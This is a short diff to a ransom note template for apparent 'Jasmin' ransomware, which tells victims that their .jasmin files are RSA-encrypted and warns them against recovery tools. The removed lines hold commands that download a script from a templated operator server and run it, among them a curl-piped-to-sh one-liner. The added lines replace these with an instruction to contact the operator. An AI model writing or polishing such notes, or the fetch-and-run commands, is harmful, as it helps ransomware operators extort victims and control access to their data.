@@ -15,18 +15,9 @@ protected by an RSA public key.
   • Do NOT use third-party recovery tools — they will corrupt your data
   • Do NOT delete .jasmin files — they contain your encrypted data
 
-🔓 HOW TO DECRYPT:
+[ HOW TO RECOVER ]
 
-  [ Windows ]  requires PowerShell 7+
-  curl.exe -sL {{SERVER_URL}}/payloads/jasmin_unlock.ps1 -o unlock.ps1
-  pwsh -File unlock.ps1 -Server {{SERVER_URL}} -K "<passphrase>"
-
-  [ Linux / macOS ]  pure openssl, no dependencies required
-  curl -sL {{SERVER_URL}}/payloads/jasmin_unlock.sh | sh -s {{SERVER_URL}} "<passphrase>"
-
-  Both commands decrypt ALL encrypted files by default.
-  To limit the scope, append the folders you want: ... "<passphrase>" /data /home
-  The passphrase is provided by the operator.
+  Contact the operator to obtain the passphrase and recovery instructions.
 
 ✅ SHA-256 integrity verification guarantees every file is restored
    to its exact original state.
